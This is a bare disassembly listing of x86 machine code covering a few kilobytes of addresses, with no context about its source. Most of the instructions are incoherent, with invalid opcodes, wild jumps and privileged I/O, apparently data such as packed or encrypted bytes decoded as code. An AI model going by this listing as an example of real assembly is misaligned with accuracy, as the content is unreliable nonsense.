  40a33d:	aaa    
  40a33e:	icebp  
  40a33f:	mov    ah,0x76
  40a341:	add    BYTE PTR [edi],ch
  40a343:	cld    
  40a344:	mov    WORD PTR [eax+esi*2-0x5],fs
  40a348:	(bad)  
  40a349:	ss ret 0xb4fa
  40a34d:	ins    DWORD PTR es:[edi],dx
  40a34e:	xor    al,0xfc
  40a350:	(bad)  
  40a351:	adc    ebp,ecx
  40a353:	jle    0x40a355
  40a355:	jmp    0x6c4f6c0b
  40a35a:	retf   0xfefa
  40a35d:	push   cs
  40a35e:	aaa    
  40a35f:	mov    dh,0xbb
  40a361:	pop    es
  40a362:	das    
  40a363:	cld    
  40a364:	out    0xd5,eax
  40a366:	stos   DWORD PTR es:[edi],eax
  40a367:	sti    
  40a368:	(bad)  
  40a369:	mul    BYTE PTR [esi-0x3f]
  40a36c:	std    
  40a36d:	out    dx,al
  40a36e:	xor    al,0xf1
  40a370:	test   BYTE PTR [esi+0x2c],dh
  40a373:	cld    
  40a374:	enter  0x99ab,0xfb
  40a378:	push   ebx
  40a379:	bound  edi,QWORD PTR [ecx]
  40a37b:	mov    al,bl
  40a37d:	cdq    
  40a37e:	aaa    
  40a37f:	cld    
  40a380:	(bad)  
  40a381:	scas   al,BYTE PTR es:[edi]
  40a382:	push   es
  40a383:	sar    ebp,0xbe
  40a386:	xor    al,0x9
  40a388:	add    cl,ch
  40a38a:	xor    dl,BYTE PTR [eax-0x449622bc]
  40a390:	jae    0x40a37e
  40a392:	mov    dl,0x40
  40a394:	add    BYTE PTR [esi+ebx*2],dl
  40a397:	lock or al,ch
  40a39a:	xor    cl,BYTE PTR [ecx]
  40a39c:	push   0x48849b
  40a3a1:	add    BYTE PTR [edi+0xe80a8b],ch
  40a3a7:	scas   eax,DWORD PTR es:[edi]
  40a3a8:	jbe    0x40a3a9
  40a3aa:	call   ecx
  40a3ac:	jnp    0x40a366
  40a3ae:	(bad)  
  40a3af:	lahf   
  40a3b0:	add    al,0x68
  40a3b2:	sbb    DWORD PTR ds:[edi],eax
  40a3b5:	add    BYTE PTR [ebp-0x1b86b],cl
  40a3bb:	jg     0x40a372
  40a3bd:	out    0x67,al
  40a3bf:	outs   dx,DWORD PTR ds:[esi]
  40a3c0:	add    al,0xff
  40a3c2:	lea    edx,[ebp+0x3ffffe47]
  40a3c8:	mov    ch,0xfd
  40a3ca:	mov    ch,0x80
  40a3cc:	add    edi,edi
  40a3ce:	push   DWORD PTR [eax+0x6e]
  40a3d1:	jp     0x40a3d3
  40a3d3:	fdivr  DWORD PTR [edi-0x7b]
  40a3d6:	mov    esp,0x40ff043e
  40a3db:	iret   
  40a3dc:	jp     0x40a3a4
  40a3de:	add    al,bl
  40a3e0:	push   es
  40a3e1:	lea    edx,[ebp-0xfce6]
  40a3e7:	(bad)  
  40a3e8:	or     BYTE PTR [eax],dl
  40a3ea:	add    al,cl
  40a3ec:	push   es
  40a3ed:	je     0x40a902
  40a3f3:	sbb    eax,0x7ffec26b
  40a3f8:	add    eax,0xb52c428d
  40a3fd:	in     ax,dx
  40a3ff:	das    
  40a400:	(bad)  
  40a401:	(bad)  
  40a402:	out    0xdc,eax
  40a404:	mov    ?,esi
  40a406:	inc    DWORD PTR [ebx+0x27546]
  40a40c:	jae    0x40a399
  40a40e:	mov    edx,DWORD PTR [ebp-0xfb66]
  40a414:	ffree  st(7)
  40a416:	sub    dl,BYTE PTR [eax+0x40]
  40a419:	adc    al,0x4f
  40a41b:	inc    ecx
  40a41c:	xor    eax,esi
  40a41e:	sbb    dl,BYTE PTR [edx-0x35]
  40a421:	out    dx,eax
  40a422:	add    cl,BYTE PTR [ebx]
  40a424:	jno    0x40a423
  40a426:	add    bl,ch
  40a428:	fisubr DWORD PTR [esi+ebp*2-0x3e]
  40a42c:	aaa    
  40a42d:	jae    0x40a433
  40a42f:	lea    esi,[ebx-0x44]
  40a432:	jns    0x40a3b9
  40a434:	frstor [ecx+0x4]
  40a437:	dec    DWORD PTR [ecx+0x3140ba8a]
  40a43d:	push   ebx
  40a43e:	mov    cs,WORD PTR [ebx]
  40a440:	sbb    DWORD PTR [ebx+0x4306ff70],esi
  40a446:	dec    esi
  40a447:	mov    ah,0xff
  40a449:	cmp    al,BYTE PTR [eax+edx*2]
  40a44c:	or     DWORD PTR [ebx+0x71],edx
  40a44f:	(bad)  
  40a450:	out    dx,al
  40a451:	push   0x22e7b07e
  40a456:	add    al,0x50
  40a458:	dec    ecx
  40a459:	jb     0x40a401
  40a45b:	inc    eax
  40a45c:	xor    DWORD PTR [ebx],edx
  40a45e:	dec    esi
  40a45f:	mov    al,0xcf
  40a461:	or     al,BYTE PTR [eax+ebp*8]
  40a464:	cmp    BYTE PTR [edi+0x302a0002],al
  40a46a:	(bad)  
  40a46b:	adc    cl,BYTE PTR [ecx+0x54]
  40a46e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a46f:	inc    eax
  40a470:	add    BYTE PTR [ecx],dh
  40a472:	jmp    0x40a4c0
  40a474:	mov    al,0xa7
  40a476:	loop   0x40a47a
  40a478:	jmp    DWORD PTR [eax+edi*8]
  40a47b:	jmp    0x8e8:0x2d29478
  40a482:	pop    edx
  40a483:	add    edi,edi
  40a485:	mov    ah,0x6c
  40a487:	(bad)  
  40a488:	std    
  40a489:	jle    0x40a445
  40a48b:	push   ebx
  40a48c:	(bad)  
  40a48d:	mov    esp,0x6eff0273
  40a492:	(bad)  
  40a493:	call   0xe949d610
  40a498:	mov    BYTE PTR [esi+0x56496409],bl
  40a49e:	stc    
  40a49f:	xchg   ebp,eax
  40a4a0:	add    eax,DWORD PTR [esp+edi*4-0xfb9fc72]
  40a4a7:	mov    al,ds:0x7e09317d
  40a4ac:	mov    ecx,0x375fa7e
  40a4b1:	sbb    DWORD PTR [ebx+0x5f],eax
  40a4b4:	add    esp,DWORD PTR [esi]
  40a4b6:	ret    
  40a4b7:	sub    cl,BYTE PTR [ecx+esi*1]
  40a4ba:	pop    esi
  40a4bb:	jb     0x40a4ad
  40a4bd:	pop    ss
  40a4be:	jg     0x40a4a5
  40a4c0:	jmp    0x40a462
  40a4c2:	fwait
  40a4c3:	dec    ebp
  40a4c4:	add    edi,DWORD PTR [edx]
  40a4c6:	leave  
  40a4c7:	mov    esp,0x3e596112
  40a4cc:	jns    0x40a4f7
  40a4ce:	loope  0x40a451
  40a4d0:	add    ch,dh
  40a4d2:	clc    
  40a4d3:	inc    eax
  40a4d4:	sub    eax,DWORD PTR [eax]
  40a4d6:	mov    bh,0xf8
  40a4d8:	and    eax,0xe901f0cd
  40a4dd:	pop    eax
  40a4de:	stos   BYTE PTR es:[edi],al
  40a4df:	in     eax,0x69
  40a4e1:	enter  0x63ca,0xe9
  40a4e5:	ins    DWORD PTR es:[edi],dx
  40a4e6:	adc    al,bh
  40a4e8:	jnp    0x40a4f5
  40a4ea:	leave  
  40a4eb:	inc    edx
  40a4ec:	jb     0x40a4f1
  40a4ee:	mov    dh,0x82
  40a4f0:	stos   DWORD PTR es:[edi],eax
  40a4f1:	call   FWORD PTR [eax]
  40a4f3:	adc    ebp,esi
  40a4f5:	js     0x40a530
  40a4f7:	loope  0x40a49e
  40a4f9:	add    bl,BYTE PTR [esi-0x69d8ad08]
  40a4ff:	jle    0x40a4e2
  40a501:	jmp    0x40a4c8
  40a503:	clc    
  40a504:	int    0x2
  40a506:	sbb    edx,DWORD PTR ds:0xe12978c6
  40a50c:	xchg   ecx,eax
  40a50d:	add    dh,BYTE PTR [esi-0x8]
  40a510:	inc    DWORD PTR [edx+0x35]
  40a513:	popa   
  40a514:	mov    esi,0x6808ec0c
  40a519:	dec    edi
  40a51a:	ror    DWORD PTR [ecx+0x0],1
  40a51d:	sahf   
  40a51e:	sbb    ebx,ebx
  40a520:	inc    edi
  40a521:	sub    BYTE PTR ds:0x3379f0e1,dh
  40a527:	clc    
  40a528:	or     ch,BYTE PTR [ecx+0x11501cc6]
  40a52e:	xchg   ecx,eax
  40a52f:	push   ebp
  40a530:	inc    ecx
  40a531:	jmp    0xe1b59db8
  40a536:	sbb    cl,cl
  40a538:	sti    
  40a539:	data16 add BYTE PTR [ebx],dh
  40a53c:	loope  0x40a4fe
  40a53e:	ins    BYTE PTR es:[edi],dx
  40a53f:	xor    edi,eax
  40a541:	imul   ebp,ecx,0xa85cc79a
  40a547:	xor    ah,BYTE PTR [ecx-0x5a]
  40a54a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a54b:	jne    0x40a556
  40a54d:	push   esp
  40a54f:	fmul   QWORD PTR [edi+0x41]
  40a552:	jmp    0x2ed06f31
  40a557:	xor    eax,DWORD PTR [eax+eax*8]
  40a55a:	popf   
  40a55b:	inc    esi
  40a55c:	pop    ecx
  40a55d:	push   0x4a517d
  40a562:	mov    ecx,0x1087e33
  40a567:	pushf  
  40a568:	repz inc BYTE PTR [esi]
  40a56b:	retf   0x8c99
  40a56e:	(bad)  
  40a56f:	xor    BYTE PTR [ebx+0x0],ah
  40a572:	xor    DWORD PTR [edx],0x61
  40a575:	loopne 0x40a503
  40a577:	in     eax,dx
  40a578:	or     BYTE PTR [eax-0x17],ch
  40a57b:	xor    cl,BYTE PTR [ecx]
  40a57d:	adc    cl,0xb8
  40a580:	xchg   esi,edi
  40a582:	(bad)  
  40a583:	cmp    al,0xc9
  40a585:	jae    0x40a58c
  40a587:	fstp   QWORD PTR [eax-0x18]
  40a58a:	add    BYTE PTR [esi-0x6e],cl
  40a58d:	std    
  40a58e:	inc    DWORD PTR [ebx+0x481472cb]
  40a594:	gs pushf 
  40a596:	pop    ebp
  40a597:	sbb    DWORD PTR ds:0x53dff50,ecx
  40a59d:	call   0x9f4a5fe
  40a5a2:	(bad)  
  40a5a3:	call   0x3e2dac
  40a5a8:	mov    al,0x51
  40a5aa:	(bad)  
  40a5ab:	push   DWORD PTR [edi-0x48038af7]
  40a5b1:	jg     0x40a5bb
  40a5b3:	call   0x3e2d8a
  40a5b8:	ror    edi,1
  40a5ba:	add    al,BYTE PTR [eax]
  40a5bc:	fld    QWORD PTR [ebp-0x6b37e16]
  40a5c2:	cmc    
  40a5c3:	jmp    DWORD PTR [edi-0x7a]
  40a5c6:	inc    ebx
  40a5c7:	cld    
  40a5c8:	enter  0x7509,0x10
  40a5cc:	ja     0x40a64c
  40a5ce:	or     al,0xe8
  40a5d0:	jmp    0xdca:0xd3000073
  40a5d7:	test   DWORD PTR [ebx],edx
  40a5d9:	or     eax,0x4e0f0000
  40a5de:	clc    
  40a5df:	add    al,cl
  40a5e1:	or     al,BYTE PTR [eax]
  40a5e3:	(bad)  
  40a5e4:	popf   
  40a5e5:	(bad)  
  40a5e6:	std    
  40a5e7:	pop    es
  40a5e8:	fmul   DWORD PTR [edx]
  40a5ea:	push   0x0
  40a5ec:	mov    ds:0xa2006a0a,al
  40a5f1:	or     cl,BYTE PTR [ebp-0x72a553bb]
  40a5f7:	test   DWORD PTR [ecx+esi*8+0x858fffd],ebx
  40a5fe:	jne    0x40a5f8
  40a600:	ja     0x40a681
  40a602:	cld    
  40a603:	call   0x7b54d708
  40a608:	add    BYTE PTR [ecx],dh
  40a60a:	jmp    0x40a5ce
  40a60c:	jae    0x40a642
  40a60e:	fst    DWORD PTR [eax+0x6ae076ff]
  40a614:	scas   al,BYTE PTR es:[edi]
  40a615:	stc    
  40a616:	and    BYTE PTR [edi+edi*8],al
  40a619:	fmul   st(7),st
  40a61b:	jmp    0xaa4f:0xffafc184
  40a622:	mov    al,0x8d
  40a624:	test   BYTE PTR [ebp-0x69],al
  40a627:	(bad)  
  40a628:	(bad)  
  40a629:	loope  0x40a65c
  40a62b:	in     al,dx
  40a62c:	je     0x40a5cf
  40a62e:	(bad)  
  40a62f:	dec    DWORD PTR [eax-0x1078f54]
  40a635:	cs mov bl,cl
  40a638:	mov    esp,DWORD PTR [esi]
  40a63a:	ins    DWORD PTR es:[di],dx
  40a63c:	add    BYTE PTR [ecx+0x31416206],cl
  40a642:	push   edi
  40a643:	mov    dh,0xef
  40a645:	push   es
  40a646:	pop    edi
  40a647:	add    bh,bh
  40a649:	jl     0x40a61f
  40a64b:	jmp    0xac89:0x4eaecd
  40a652:	inc    ebx
  40a653:	clc    
  40a654:	(bad)  
  40a655:	out    dx,al
  40a656:	bound  edi,QWORD PTR [esi+0x26deeb]
  40a65c:	add    BYTE PTR [ebp-0xd],ah
  40a65f:	push   0x1
  40a661:	xor    DWORD PTR [edi],eax
  40a663:	sar    esi,0x84
  40a666:	or     edi,eax
  40a668:	inc    BYTE PTR [eax]
  40a66a:	mov    BYTE PTR [esi],0x76
  40a66d:	or     cl,cl
  40a66f:	xchg   DWORD PTR [esi+edi*8-0x144b094a],esi
  40a676:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a677:	(bad)  
  40a678:	(bad)  
  40a679:	out    0xb8,eax
  40a67b:	push   ebx
  40a67c:	add    bh,bh
  40a67e:	sahf   
  40a67f:	or     BYTE PTR [esp+esi*8-0x220a61],bl
  40a686:	add    eax,0x3979d605
  40a68b:	loope  0x40a6a5
  40a68d:	(bad)  
  40a68e:	jg     0x40a685
  40a690:	lds    edi,FWORD PTR [ecx-0x42027a]
  40a696:	push   esi
  40a697:	arpl   WORD PTR [ebp-0x1],sp
  40a69a:	addr16 cmc 
  40a69c:	and    edi,esp
  40a69e:	dec    ecx
  40a69f:	dec    esp
  40a6a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a6a1:	call   DWORD PTR [edi-0xb]
  40a6a4:	adc    eax,DWORD PTR [eax]
  40a6a6:	pop    ecx
  40a6a7:	jg     0x40a6b9
  40a6a9:	add    al,0x31
  40a6ab:	shr    BYTE PTR [edx+0x725c3110],0xf0
  40a6b2:	mov    cl,0xcc
  40a6b4:	nop
  40a6b5:	imul   DWORD PTR [edi]
  40a6b7:	cmc    
  40a6b8:	arpl   WORD PTR [ecx+0x25],cx
  40a6bb:	pop    edx
  40a6bc:	outs   dx,BYTE PTR ds:[esi]
  40a6bd:	jns    0x40a700
  40a6bf:	hlt    
  40a6c0:	fisttp DWORD PTR [edi]
  40a6c2:	or     DWORD PTR [ecx-0x1f],edi
  40a6c5:	add    esi,DWORD PTR [ecx]
  40a6c7:	add    BYTE PTR [ecx],ch
  40a6c9:	shrd   DWORD PTR [ebx],edx,0xe8
  40a6cd:	add    eax,DWORD PTR [eax]
  40a6cf:	xor    esp,ecx
  40a6d1:	stos   DWORD PTR es:[edi],eax
  40a6d2:	sti    
  40a6d3:	div    ah
  40a6d5:	call   0x3d8f9cdd
  40a6da:	jmp    FWORD PTR [edi]
  40a6dc:	or     ecx,ebp
  40a6de:	imul   esi,DWORD PTR [ecx],0x3169e95f
  40a6e4:	pop    edi
  40a6e5:	jmp    0xb93e1c7a
  40a6ea:	nop
  40a6eb:	lods   eax,DWORD PTR ds:[esi]
  40a6ec:	std    
  40a6ed:	adc    eax,0x659bfff
  40a6f2:	jns    0x40a6ad
  40a6f4:	hlt    
  40a6f5:	jae    0x40a6f6
  40a6f7:	xchg   esi,eax
  40a6f8:	dec    esi
  40a6f9:	add    BYTE PTR [ecx+0x32],dh
  40a6fc:	or     DWORD PTR [ebx],ecx
  40a6fe:	sub    DWORD PTR [ecx],ebx
  40a700:	push   cs
  40a701:	jmp    0x49d9ce
  40a706:	push   ecx
  40a707:	fisttp WORD PTR [ecx+eax*2-0x17]
  40a70b:	xchg   DWORD PTR [ebp+0x10],edi
  40a70e:	shl    DWORD PTR [ebx+eax*4+0x7fe2c6fe],0xcf
  40a716:	ins    BYTE PTR es:[edi],dx
  40a717:	mov    ecx,0x67b6f6f8
  40a71c:	inc    esp
  40a71d:	push   edx
  40a71e:	shl    DWORD PTR [ebx+eax*4-0x725a5902],0xef
  40a726:	xchg   esi,eax
  40a727:	dec    edi
  40a728:	repz out 0xb5,eax
  40a72b:	mov    ebx,0x3503fef3
  40a730:	pop    edi
  40a731:	add    BYTE PTR [esi-0x91b8700],al
  40a737:	jle    0x40a768
  40a739:	repz je 0x40a721
  40a73c:	sbb    ch,dl
  40a73e:	lea    ebp,[esi+0x1f]
  40a741:	add    DWORD PTR [ebp+edx*2+0x5efef31f],0x56f6dfc9
  40a74c:	pop    es
  40a74d:	in     al,dx
  40a74e:	mov    dh,BYTE PTR [edi+edi*8-0xe]
  40a752:	or     ch,BYTE PTR [ecx]
  40a754:	jle    0x40a7be
  40a756:	push   eax
  40a757:	jo     0x40a712
  40a759:	jmp    0x40a751
  40a75b:	ss out 0xf2,eax
  40a75e:	mov    ah,0x41
  40a760:	out    0xf2,eax
  40a762:	(bad)  
  40a763:	adc    edx,ebp
  40a765:	cmp    esi,0x1e
  40a768:	cmp    ecx,ecx
  40a76a:	jae    0x40a70d
  40a76c:	pop    edx
  40a76d:	pop    es
  40a76e:	add    dh,bh
  40a770:	jge    0x40a7dd
  40a772:	stos   BYTE PTR es:[edi],al
  40a773:	add    BYTE PTR [esi+0x65ff004c],cl
  40a779:	loopne 0x40a770
  40a77b:	call   FWORD PTR [edi+0x300873f5]
  40a781:	jne    0x40a737
  40a783:	dec    DWORD PTR [edi+0x7f000264]
  40a789:	mov    dl,0x66
  40a78b:	mov    edx,0xff00483e
  40a790:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a791:	in     al,0xf5
  40a793:	jmp    FWORD PTR [edi-0xb]
  40a796:	jae    0x40a7a0
  40a798:	add    BYTE PTR [eax-0x60004b99],al
  40a79e:	add    BYTE PTR fs:[eax],al
  40a7a1:	lahf   
  40a7a2:	mov    dl,0x66
  40a7a4:	(bad)  
  40a7a5:	in     eax,dx
  40a7a6:	inc    edi
  40a7a7:	add    bh,bh
  40a7a9:	in     eax,0xe4
  40a7ab:	cmc    
  40a7ac:	call   FWORD PTR [edi-0x4ff78c0b]
  40a7b2:	aas    
  40a7b3:	mov    ah,0xff
  40a7b5:	scas   eax,DWORD PTR es:[edi]
  40a7b6:	in     al,0x50
  40a7b8:	mov    ebp,DWORD PTR [edi-0x534a020c]
  40a7be:	cld    
  40a7bf:	std    
  40a7c0:	push   DWORD PTR [eax-0x700074b4]
  40a7c6:	hlt    
  40a7c7:	mov    bl,0xf0
  40a7c9:	addr16 hlt 
  40a7cb:	std    
  40a7cc:	jmp    ebp
  40a7ce:	add    bh,bh
  40a7d0:	jne    0x40a7e2
  40a7d2:	(bad)  
  40a7d4:	(bad)  
  40a7d5:	outs   dx,DWORD PTR ds:[esi]
  40a7d6:	hlt    
  40a7d7:	std    
  40a7d8:	mov    ch,0x28
  40a7da:	cld    
  40a7db:	std    
  40a7dc:	push   DWORD PTR [eax+0x20]
  40a7df:	mov    edi,edi
  40a7e1:	pmuludq mm0,QWORD PTR [ebx-0x8]
  40a7e5:	inc    ecx
  40a7e6:	idiv   ah
  40a7e8:	jmp    FWORD PTR [edi]
  40a7ea:	hlt    
  40a7eb:	jae    0x40a7e9
  40a7ed:	xor    DWORD PTR [eax],ecx
  40a7ef:	inc    ebp
  40a7f0:	ja     0x40a823
  40a7f2:	loopne 0x40a7bd
  40a7f4:	shl    DWORD PTR ds:0x9d8b55e0,0x5f
  40a7fb:	enter  0xfb,0x1b
  40a7ff:	loopne 0x40a869
  40a801:	and    bl,BYTE PTR [esi+0x54e80b7d]
  40a807:	js     0x40a805
  40a809:	(bad)  
  40a80a:	mov    eax,0x3168002d
  40a80f:	loopne 0x40a7fc
  40a811:	mov    ebp,0x415dc209
  40a816:	xor    DWORD PTR [eax+0xe],ebx
  40a819:	pop    esi
  40a81a:	lock (bad) 
  40a81d:	je     0x40a858
  40a81f:	enter  0xb42a,0x5e
  40a823:	mov    ds:0x20f7166a,eax
  40a828:	add    al,0xff
  40a82a:	add    al,0xae
  40a82c:	dec    edx
  40a82d:	inc    ecx
  40a82e:	xor    DWORD PTR [ebx+0x70490875],ebx
  40a834:	(bad)  
  40a835:	(bad)  
  40a836:	sbb    BYTE PTR ss:[esi],dl
  40a839:	pop    esi
  40a83a:	jo     0x40a81c
  40a83c:	push   0x2
  40a83e:	xor    eax,esp
  40a840:	cmp    dh,0xa4
  40a843:	call   0x6b552632
  40a848:	cld    
  40a849:	addr16 pop ebx
  40a84b:	mov    dl,0x41
  40a84d:	add    BYTE PTR [ecx-0x4efffd22],bl
  40a853:	inc    edx
  40a854:	jbe    0x40a85e
  40a856:	or     DWORD PTR [edi-0x28110104],esp
  40a85c:	push   0x6ae0705e
  40a861:	add    al,BYTE PTR [eax]
  40a863:	xor    eax,esp
  40a865:	cmp    dh,0x5c
  40a868:	or     ecx,esi
  40a86a:	jmp    0x40a8e5
  40a86c:	repz sbb eax,0x157bc7fc
  40a872:	cld    
  40a873:	inc    ebp
  40a874:	add    DWORD PTR [ecx],eax
  40a876:	push   ss
  40a877:	test   eax,0x70ca05f1
  40a87c:	or     al,0xe9
  40a87e:	push   esi
  40a87f:	mov    edx,0x2d75f5e4
  40a884:	loope  0x40a88e
  40a886:	lea    edx,[edi+0x2c3f1f1]
  40a88c:	xor    BYTE PTR [ecx-0x19],dl
  40a88f:	in     al,0x47
  40a891:	jmp    0x5fa531e9
  40a896:	sti    
  40a897:	ja     0x40a8f1
  40a899:	sbb    DWORD PTR [ecx+esi*1+0x9],ebp
  40a89d:	into   
  40a89e:	mov    edx,0x4516cace
  40a8a3:	xor    DWORD PTR [ecx-0x52],ebx
  40a8a6:	jno    0x40a8d1
  40a8a8:	loope  0x40a8e8
  40a8aa:	mov    bh,0x4f
  40a8ac:	icebp  
  40a8ad:	inc    eax
  40a8ae:	ins    BYTE PTR es:[edi],dx
  40a8af:	xor    BYTE PTR [ecx],cl
  40a8b1:	xchg   BYTE PTR [edx+0x452edbd6],bh
  40a8b7:	xor    DWORD PTR [ecx-0x7a],ebx
  40a8ba:	jno    0x40a8f5
  40a8bc:	loope  0x40a8e8
  40a8be:	mov    bh,0x27
  40a8c0:	icebp  
  40a8c1:	or     BYTE PTR [edi-0x55],0xf0
  40a8c5:	ins    DWORD PTR es:[edi],dx
  40a8c6:	int    0x0
  40a8c8:	lock add ecx,ebp
  40a8cb:	push   eax
  40a8cc:	mov    edx,0xac069dd
  40a8d1:	fs jmp 0xd430fb44
  40a8d7:	or     ecx,DWORD PTR [ecx]
  40a8d9:	pop    edi
  40a8da:	outs   dx,BYTE PTR ds:[esi]
  40a8db:	sti    
  40a8dc:	out    dx,eax
  40a8dd:	and    BYTE PTR [ebx+0x1358f7],0x36
  40a8e4:	pusha  
  40a8e5:	add    eax,ebp
  40a8e7:	push   esp
  40a8e8:	(bad)  
  40a8ea:	(bad)  
  40a8eb:	xchg   ebx,eax
  40a8ec:	pop    ss
  40a8ed:	lock je 0x40a8e1
  40a8f0:	fiadd  DWORD PTR [ebx+0x62ba16fe]
  40a8f6:	sbb    al,0xe
  40a8f8:	inc    eax
  40a8f9:	add    eax,ebp
  40a8fb:	push   0xfefeefaa
  40a900:	and    ebp,ebp
  40a902:	(bad)  
  40a903:	jl     0x40a92f
  40a905:	loope  0x40a88d
  40a907:	call   0x8eab:0xc8ef
  40a90d:	lock push ebx
  40a90f:	jb     0x40a89f
  40a911:	pop    ebx
  40a912:	(bad)  
  40a913:	in     al,dx
  40a914:	cdq    
  40a915:	push   eax
  40a916:	inc    ecx
  40a917:	jmp    0xe940b24e
  40a91c:	pop    ds
  40a91d:	aam    0xfe
  40a91f:	xor    al,0x35
  40a921:	loope  0x40a8e5
  40a923:	cmp    eax,0x148b0935
  40a928:	and    eax,0xebf78c
  40a92d:	rcr    BYTE PTR [ecx],0x3
  40a930:	mov    ecx,0xf01e2af
  40a935:	mov    ah,0x32
  40a937:	pop    esp
  40a938:	sub    eax,0xae6605c0
  40a93d:	xor    al,0x4d
  40a93f:	add    BYTE PTR [esi-0x5f],bh
  40a942:	std    
  40a943:	out    0xf3,eax
  40a945:	mov    eax,ds:0xaf010009
  40a94a:	dec    esi
  40a94b:	inc    ecx
  40a94c:	jmp    0xa89ea4eb
  40a951:	xor    ah,cl
  40a953:	cmp    DWORD PTR [ebp-0x5],edi
  40a956:	out    dx,al
  40a957:	or     ch,BYTE PTR [ecx]
  40a959:	xchg   BYTE PTR [esi-0x1],ah
  40a95c:	add    BYTE PTR [ebp+0x5a15ff03],ch
  40a962:	push   ebx
  40a963:	inc    ecx
  40a964:	add    BYTE PTR [ebx-0x50],cl
  40a967:	add    cl,BYTE PTR [ebx]
  40a969:	or     BYTE PTR [ecx+0x55],bh
  40a96c:	dec    ebp
  40a96e:	xchg   ebp,eax
  40a96f:	pop    ebp
  40a970:	inc    ecx
  40a971:	fsub   DWORD PTR [esi+0xb89609b]
  40a977:	cmp    DWORD PTR ds:0x416c45,0xffffff98
  40a97e:	js     0x40a988
  40a980:	(bad)  
  40a981:	jge    0x40a90c
  40a983:	pop    ebp
  40a984:	inc    ecx
  40a985:	mov    dh,bl
  40a987:	aaa    
  40a988:	push   0xffffff88
  40a98a:	pop    ebp
  40a98b:	add    edi,edi
  40a98d:	sub    eax,0x415e98
  40a992:	cwde   
  40a993:	lock adc edx,DWORD PTR [esi-0x7cffb3b9]
  40a99a:	int3   
  40a99b:	add    BYTE PTR [ebx],cl
  40a99d:	shr    BYTE PTR [esp+ebp*1],0xff
  40a9a1:	xor    eax,0x416505
  40a9a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a9a7:	call   FWORD PTR [ebp-0x7cfaf6a1]
  40a9ad:	les    ebx,FWORD PTR [eax+esi*8+0x13]
  40a9b1:	xchg   BYTE PTR [edi],al
  40a9b3:	dec    esp
  40a9b4:	add    bh,al
  40a9b6:	dec    ebp
  40a9b7:	xchg   esi,eax
  40a9b8:	pop    esi
  40a9b9:	inc    ecx
  40a9ba:	dec    eax
  40a9bb:	or     eax,DWORD PTR [eax]
  40a9bd:	add    BYTE PTR [eax],bl
  40a9bf:	fdivp  st(7),st
  40a9c1:	inc    edx
  40a9c2:	mov    ds:0xcac959c4,eax
  40a9c7:	std    
  40a9c8:	inc    DWORD PTR [edx+0x415e97c5]
  40a9ce:	sbb    BYTE PTR [ebx],cl
  40a9d0:	je     0x40a9f1
  40a9d2:	addr16 push ds
  40a9d4:	popf   
  40a9d5:	pusha  
  40a9d6:	xor    DWORD PTR [ecx+0x5e1cff02],esp
  40a9dc:	pop    ecx
  40a9dd:	inc    ecx
  40a9de:	xor    DWORD PTR [ebx-0x40],esp
  40a9e1:	add    esp,esi
  40a9e3:	aad    0x80
  40a9e5:	pop    esi
  40a9e6:	jo     0x40a9c8
  40a9e8:	mov    edi,0x41c0b404
  40a9ed:	add    BYTE PTR [ecx],dh
  40a9ef:	loopne 0x40a9f3
  40a9f1:	add    dl,dh
  40a9f3:	mov    ch,0x8b
  40a9f5:	jmp    0x40a9f7
  40a9f7:	mov    dl,0x1c
  40a9f9:	hlt    
  40a9fa:	push   edx
  40a9fb:	stos   BYTE PTR es:[edi],al
  40a9fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9fd:	or     cl,BYTE PTR [ebx]
  40a9ff:	jno    0x40aa6d
  40aa01:	or     al,0x83
  40aa03:	and    al,0xdc
  40aa05:	add    dh,BYTE PTR [esp+esi*1+0x60]
  40aa09:	cmp    al,0x0
  40aa0b:	sbb    al,0xe7
  40aa0d:	sub    eax,eax
  40aa0f:	jmp    0x3b60:0x3107c4b8
  40aa16:	jle    0x40aa1d
  40aa18:	lock cmp DWORD PTR [esp+edx*4],0x40
  40aa1d:	inc    ebx
  40aa1e:	add    BYTE PTR [ecx],dh
  40aa20:	sub    eax,0x2b712b01
  40aa25:	retf   
  40aa26:	shr    DWORD PTR [ecx],0xe0
  40aa29:	xor    BYTE PTR [edi],0xd7
  40aa2c:	xor    al,0x3a
  40aa2e:	mov    esp,esp
  40aa30:	repz dec esp
  40aa32:	adc    DWORD PTR [ebx-0x1d],0xb
  40aa36:	rol    ah,cl
  40aa38:	fld    QWORD PTR [ebx+0x6de1257c]
  40aa3e:	add    al,0x5a
  40aa40:	mov    al,ds:0x1d2623eb
  40aa45:	or     BYTE PTR [ebx-0x21b8c],cl
  40aa4b:	xor    ah,al
  40aa4d:	add    al,cl
  40aa4f:	adc    DWORD PTR [ecx],ecx
  40aa51:	jmp    0x40aaa6
  40aa53:	sbb    ecx,edx
  40aa55:	jo     0x40aa4f
  40aa57:	call   FWORD PTR [eax+0x62]
  40aa5a:	dec    esi
  40aa5b:	add    BYTE PTR [ecx],ch
  40aa5d:	dec    ebx
  40aa5e:	mov    ecx,0x9afd65f8
  40aa63:	jmp    0x40aa45
  40aa65:	xchg   esp,eax
  40aa66:	cmp    eax,0x205286f8
  40aa6b:	lds    ebp,FWORD PTR [esi]
  40aa6d:	or     DWORD PTR [edx],eax
  40aa6f:	(bad)  
  40aa71:	jae    0x40aa68
  40aa73:	clc    
  40aa74:	cmp    eax,0x4b039301
  40aa79:	or     DWORD PTR [esi],edx
  40aa7b:	push   cs
  40aa7c:	stos   DWORD PTR es:[edi],eax
  40aa7d:	dec    ebp
  40aa7e:	test   al,0x3
  40aa80:	mov    dl,0xc4
  40aa82:	fmul   DWORD PTR [ecx+esi*2]
  40aa85:	je     0x40aa0b
  40aa87:	mov    dh,ch
  40aa89:	in     al,dx
  40aa8a:	add    BYTE PTR [edi],0xa4
  40aa8d:	inc    ebx
  40aa8e:	stc    
  40aa8f:	push   edx
  40aa90:	cdq    
  40aa91:	mov    ecx,0x6287f770
  40aa96:	jmp    0x3939a023
  40aa9b:	idiv   ebp
  40aa9d:	in     al,dx
  40aa9e:	int    0x11
  40aaa0:	retf   
  40aaa1:	dec    ebp
  40aaa2:	sub    BYTE PTR [edx+esi*4],al
  40aaa5:	(bad)  
  40aaa6:	in     al,dx
